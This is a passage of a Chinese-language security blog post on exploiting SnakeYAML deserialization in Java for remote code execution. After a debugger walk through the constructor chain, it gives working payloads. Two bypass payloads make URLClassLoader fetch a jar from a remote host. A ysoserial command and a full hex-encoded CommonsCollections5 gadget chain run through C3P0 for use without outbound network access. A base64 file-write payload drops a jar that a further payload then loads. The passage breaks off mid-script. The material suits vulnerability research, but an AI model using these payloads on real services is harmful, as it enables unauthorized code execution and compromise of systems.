number">9000</span><span class="token operator">/</span>yaml<span class="token operator">-</span>payload<span class="token punctuation">.</span>jar<span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>
</code></pre> 
<p>一共5条值，先留个印象</p> 
<p>getSingleNode()执行完后返回这五条数据，给node属性，接着吊用<code>constructDocument()</code>对其进行处理</p> 
<p><img src="https://images2.imgbox.com/18/e4/TXo6Jc1s_o.png" alt="image-20221111200352482.png"></p> 
<p>接着跟进<code>constructObject()</code></p> 
<p><img src="https://images2.imgbox.com/d2/b8/9JJ3ELGr_o.png" alt="image-20221111200449312.png"></p> 
<p>再跟进<code>constructObjectNoCheck()</code></p> 
<pre><code class="prism language-java"><span class="token keyword">protected</span> <span class="token class-name">Object</span> <span class="token function">constructObject</span><span class="token punctuation">(</span><span class="token class-name">Node</span> node<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>constructedObjects<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> constructedObjects<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token function">constructObjectNoCheck</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><code>constructObjectNoCheck()</code>中<code>recursiveObjects</code>值为空，所以不执行if，并通过add将node追加到其中，之后由于<code>constructedObjects</code>值也是空，所以三目运算执行" : "后边的内容</p> 
<pre><code class="prism language-java"><span class="token keyword">protected</span> <span class="token class-name">Object</span> <span class="token function">constructObjectNoCheck</span><span class="token punctuation">(</span><span class="token class-name">Node</span> node<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>recursiveObjects<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ConstructorException</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">"found unconstructable recursive node"</span><span class="token punctuation">,</span>
                node<span class="token punctuation">.</span><span class="token function">getStartMark</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    recursiveObjects<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Construct</span> constructor <span class="token operator">=</span> <span class="token function">getConstructor</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Object</span> data <span class="token operator">=</span> <span class="token punctuation">(</span>constructedObjects<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> constructedObjects<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span>
            <span class="token operator">:</span> constructor<span class="token punctuation">.</span><span class="token function">construct</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p>跟进<code>contruct()</code></p> 
<pre><code class="prism language-java"><span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">construct</span><span class="token punctuation">(</span><span class="token class-name">Node</span> node<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">try</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token function">getConstructor</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">construct</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ConstructorException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">throw</span> e<span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ConstructorException</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">"Can't construct a java object for "</span>
                <span class="token operator">+</span> node<span class="token punctuation">.</span><span class="token function">getTag</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"; exception="</span> <span class="token operator">+</span> e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> node<span class="token punctuation">.</span><span class="token function">getStartMark</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>再跟进<code>constuct()</code></p> 
<pre><code class="prism language-java"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Node</span> argumentNode <span class="token operator">:</span> snode<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> type <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getParameterTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token comment">// set runtime classes for arguments</span>
    argumentNode<span class="token punctuation">.</span><span class="token function">setType</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>
    argumentList<span class="token punctuation">[</span>index<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">constructObject</span><span class="token punctuation">(</span>argumentNode<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>下边通过迭代的方式，调用<code>constructObject()</code></p> 
<p>而到了<code>constructObject()</code>就相当于又回去了,再一次调用</p> 
<pre><code class="prism language-java"><span class="token function">constructObjectNoCheck</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span>
<span class="token class-name">BaseConstructor</span>#<span class="token function">construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span>
<span class="token class-name">Contructor</span>#<span class="token function">construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span>
通过迭代<span class="token class-name">Contructor</span>#<span class="token function">constructObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> 
<p>执行constructObject()后，接着又回去了，连续执行四次，指到recursiveObjects中包含刚才提到的五条值</p> 
<p><img src="https://images2.imgbox.com/07/7b/SeZAV7Kg_o.png" alt="image-20221111203056008.png"></p> 
<p>接着一直执行到迭代哪里，执行到下边的newInstance，这里具体的话分为3步，首先是<code>URL</code>的实例化，之后是<code>URLClassLoader</code>的实例化，最终实例化<code>ScriptEngineManager</code></p> 
<p><img src="https://images2.imgbox.com/be/74/3fErG6Ra_o.png" alt="image-20221111203329889.png"></p> 
<p>实例化后回到了<code>ScriptEngineManager</code>的流程里，经过一级级调用触发远程代码执行</p> 
<p><img src="https://images2.imgbox.com/2e/87/Ca1IG4V2_o.png" alt="image-20221111203354253.png"></p> 
<h2><a id="ByPass_452"></a>ByPass</h2> 
<p>前边提到了Bypass，这里记录两种bypass方式</p> 
<p>参考：<a href="https://b1ue.cn/archives/407.html" rel="nofollow">SnakeYaml 反序列化的一个小 trick - 浅蓝 's blog (b1ue.cn)</a></p> 
<pre><code class="prism language-java"><span class="token operator">!</span><span class="token operator">&lt;</span>tag<span class="token operator">:</span>yaml<span class="token punctuation">.</span>org<span class="token punctuation">,</span><span class="token number">2002</span><span class="token operator">:</span><span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>script<span class="token punctuation">.</span></span>ScriptEngineManager</span><span class="token operator">&gt;</span> 
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">&lt;</span>tag<span class="token operator">:</span>yaml<span class="token punctuation">.</span>org<span class="token punctuation">,</span><span class="token number">2002</span><span class="token operator">:</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URLClassLoader</span><span class="token operator">&gt;</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">&lt;</span>tag<span class="token operator">:</span>yaml<span class="token punctuation">.</span>org<span class="token punctuation">,</span><span class="token number">2002</span><span class="token operator">:</span>java<span class="token punctuation">.</span>net<span class="token punctuation">.</span><span class="token constant">URL</span><span class="token operator">&gt;</span> 
<span class="token punctuation">[</span><span class="token string">"http://ip/yaml-payload.jar"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
</code></pre> 
<pre><code class="prism language-java"><span class="token operator">%</span><span class="token constant">TAG</span> <span class="token operator">!</span> tag<span class="token operator">:</span>yaml<span class="token punctuation">.</span>org<span class="token punctuation">,</span><span class="token number">2002</span><span class="token operator">:</span>
<span class="token operator">--</span><span class="token operator">-</span>
<span class="token operator">!</span><span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>script<span class="token punctuation">.</span></span>ScriptEngineManager</span> <span class="token punctuation">[</span><span class="token operator">!</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URLClassLoader</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token operator">!</span>java<span class="token punctuation">.</span>net<span class="token punctuation">.</span><span class="token constant">URL</span> <span class="token punctuation">[</span><span class="token string">"http://ip/yaml-payload.jar"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
</code></pre> 
<h2><a id="_472"></a>不出网利用</h2> 
<h3><a id="C3P0_474"></a>C3P0</h3> 
<p>Fastjson中可以用C3P0.WrapperConnectionPoolDataSource对HEX序列化字节码进行本地调用，而在snakeyaml也可用同样的方式进行不出网利用</p> 
<p>根据环境中的依赖选择利用链，这里以CC5为例</p> 
<pre><code class="prism language-java">java <span class="token operator">-</span>jar ysoserial<span class="token operator">-</span><span class="token number">0.0</span><span class="token number">.5</span><span class="token punctuation">.</span>jar <span class="token class-name">CommonsCollections5</span> <span class="token string">"calc"</span> <span class="token operator">&gt;</span> <span class="token number">1.</span>txt
</code></pre> 
<p>将字节码文件转为16进制，传入payload中，即可进行恶意字节码加载</p> 
<pre><code class="prism language-java"><span class="token operator">!</span><span class="token operator">!</span><span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>mchange<span class="token punctuation">.</span>v2<span class="token punctuation">.</span>c3p0<span class="token punctuation">.</span></span>WrapperConnectionPoolDataSource</span>
userOverridesAsString<span class="token operator">:</span> '<span class="token class-name">HexAsciiSerializedMap</span><span class="token operator">:</span><span class="token number">16</span>进制数据<span class="token punctuation">;</span>'
</code></pre> 
<p>POC:</p> 
<pre><code class="prism language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SnakeYaml</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token string">"!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\n"</span> <span class="token operator">+</span>
                <span class="token string">"userOverridesAsString: 'HexAsciiSerializedMap:ACED00057372002E6A617661782E6D616E6167656D656E742E42616441747472696275746556616C7565457870457863657074696F6ED4E7DAAB632D46400200014C000376616C7400124C6A6176612F6C616E672F4F626A6563743B787200136A6176612E6C616E672E457863657074696F6ED0FD1F3E1A3B1CC4020000787200136A6176612E6C616E672E5468726F7761626C65D5C635273977B8CB0300044C000563617573657400154C6A6176612F6C616E672F5468726F7761626C653B4C000D64657461696C4D6573736167657400124C6A6176612F6C616E672F537472696E673B5B000A737461636B547261636574001E5B4C6A6176612F6C616E672F537461636B5472616365456C656D656E743B4C001473757070726573736564457863657074696F6E737400104C6A6176612F7574696C2F4C6973743B787071007E0008707572001E5B4C6A6176612E6C616E672E537461636B5472616365456C656D656E743B02462A3C3CFD22390200007870000000037372001B6A6176612E6C616E672E537461636B5472616365456C656D656E746109C59A2636DD8502000449000A6C696E654E756D6265724C000E6465636C6172696E67436C61737371007E00054C000866696C654E616D6571007E00054C000A6D6574686F644E616D6571007E000578700000005374002679736F73657269616C2E7061796C6F6164732E436F6D6D6F6E73436F6C6C656374696F6E7335740018436F6D6D6F6E73436F6C6C656374696F6E73352E6A6176617400096765744F626A6563747371007E000B0000003571007E000D71007E000E71007E000F7371007E000B0000002274001979736F73657269616C2E47656E65726174655061796C6F616474001447656E65726174655061796C6F61642E6A6176617400046D61696E737200266A6176612E7574696C2E436F6C6C656374696F6E7324556E6D6F6469666961626C654C697374FC0F2531B5EC8E100200014C00046C69737471007E00077872002C6A6176612E7574696C2E436F6C6C656374696F6E7324556E6D6F6469666961626C65436F6C6C656374696F6E19420080CB5EF71E0200014C0001637400164C6A6176612F7574696C2F436F6C6C656374696F6E3B7870737200136A6176612E7574696C2E41727261794C6973747881D21D99C7619D03000149000473697A657870000000007704000000007871007E001A78737200346F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6B657976616C75652E546965644D6170456E7472798AADD29B39C11FDB0200024C00036B657971007E00014C00036D617074000F4C6A6176612F7574696C2F4D61703B7870740003666F6F7372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000057372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E7471007E00017870767200116A6176612E6C616E672E52756E74696D65000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D6571007E00055B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007400096765744D6574686F647571007E003200000002767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707671007E00327371007E002B7571007E002F00000002707571007E002F00000000740006696E766F6B657571007E003200000002767200106A6176612E6C616E672E4F626A656374000000000000000000000078707671007E002F7371007E002B757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B4702000078700000000174000463616C63740004657865637571007E00320000000171007E00377371007E0027737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F40000000000000770800000010000000007878;'"</span><span class="token punctuation">;</span>

        <span class="token class-name">Yaml</span> yaml <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Yaml</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        yaml<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<h3><a id="_505"></a>本地文件写入</h3> 
<p>在fastjson中，可以通过如下命令进行文件写入，而snakeyaml利用方式在很多方面都有很大的相似之处</p> 
<pre><code class="prism language-java"><span class="token punctuation">{<!-- --></span>
  <span class="token string">"@type"</span><span class="token operator">:</span> <span class="token string">"java.lang.AutoCloseable"</span><span class="token punctuation">,</span>
  <span class="token string">"@type"</span><span class="token operator">:</span> <span class="token string">"sun.rmi.server.MarshalOutputStream"</span><span class="token punctuation">,</span>
  <span class="token string">"out"</span><span class="token operator">:</span> <span class="token punctuation">{<!-- --></span>
    <span class="token string">"@type"</span><span class="token operator">:</span> <span class="token string">"java.util.zip.InflaterOutputStream"</span><span class="token punctuation">,</span>
    <span class="token string">"out"</span><span class="token operator">:</span> <span class="token punctuation">{<!-- --></span>
      <span class="token string">"@type"</span><span class="token operator">:</span> <span class="token string">"java.io.FileOutputStream"</span><span class="token punctuation">,</span>
      <span class="token string">"file"</span><span class="token operator">:</span> <span class="token string">"dst"</span><span class="token punctuation">,</span>
      <span class="token string">"append"</span><span class="token operator">:</span> <span class="token string">"false"</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token string">"infl"</span><span class="token operator">:</span> <span class="token punctuation">{<!-- --></span>
      <span class="token string">"input"</span><span class="token operator">:</span> <span class="token string">"eJwL8nUyNDJSyCxWyEgtSgUAHKUENw=="</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token string">"bufLen"</span><span class="token operator">:</span> <span class="token number">1048576</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token string">"protocolVersion"</span><span class="token operator">:</span> <span class="token number">1</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>所以构造snakeyaml的payload：</p> 
<pre><code>!!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!java.io.FileOutputStream [!!java.io.File ["filePath"],false],!!java.util.zip.Inflater  { input: !!binary base64 },1048576]]
</code></pre> 
<p>filepath是写入路径，base64是我们要写入文件的base64编码</p> 
<p>poc：</p> 
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">snakeYaml</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>yaml<span class="token punctuation">.</span>snakeyaml<span class="token punctuation">.</span></span><span class="token class-name">Yaml</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SnakeYaml</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token string">"!!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!java.io.FileOutputStream [!!java.io.File [\"./yaml-payload.jar\"],false],!!java.util.zip.Inflater  { input: !!binary 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 },1048576]]\n"</span><span class="token punctuation">;</span>
        <span class="token class-name">Yaml</span> yaml <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Yaml</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        yaml<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>写入本地之后就可以通过ScriptEngineManager方式进行本地读取了</p> 
<pre><code class="prism language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SnakeYaml</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token string">"!!javax.script.ScriptEngineManager [\n"</span> <span class="token operator">+</span>
                <span class="token string">"  !!java.net.URLClassLoader [[\n"</span> <span class="token operator">+</span>
                <span class="token string">"    !!java.net.URL [\"file:///yaml-payload.jar\"]\n"</span> <span class="token operator">+</span>
                <span class="token string">"  ]]\n"</span> <span class="token operator">+</span>
                <span class="token string">"]"</span><span class="token punctuation">;</span>
        <span class="token class-name">Yaml</span> yaml <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Yaml</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        yaml<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/a5/b2/FwF3Wqb4_o.png" alt="image-20221111231030538.png"></p> 
<p>这里也可以直接用师傅写的脚本：<a href="https://xz.aliyun.com/t/10655#toc-4" rel="nofollow">SnakeYaml 之不出网RCE - 先知社区 (aliyun.com)</a></p> 
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>zlg<span class="token punctuation">.</span>serialize<span class="token punctuation">.</span>snakeyaml</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>yaml<span class="token punctuation">.</span>snakeyaml<span class="token punctuation">.</span></span><span class="token class-name">Yaml</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>charset<span class="token punctuation">.</span></span><span class="token class-name">StandardCharsets</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>zip<span class="token punctuation">.</span></span><span class="token class-name">Deflater</span></span><span class="token punctuation">;</span>


<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SnakeYamlOffInternet</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">String</span> poc <span class="token operator">=</span> <span class="token function">createPoC</span><span class="token punctuation">(</span><span class="token string">"./1.txt"</span><span class="token punctuation">,</span><span class="token string">"./file/yaml-payload.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Yaml</span> yaml <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Yaml</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        yaml<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span>poc<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">}</span>


    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">createPoC</span><span class="token punctuation">(</span><span class="token class-name">String</span> <span class="token class-name">SrcPath</span><span class="token punctuation">,</span><span class="token class-name">String</span> <span class="token class-name">Destpath</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">File</span> file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token class-name">SrcPath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Long</span> <span class="token class-name">FileLength</span> <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
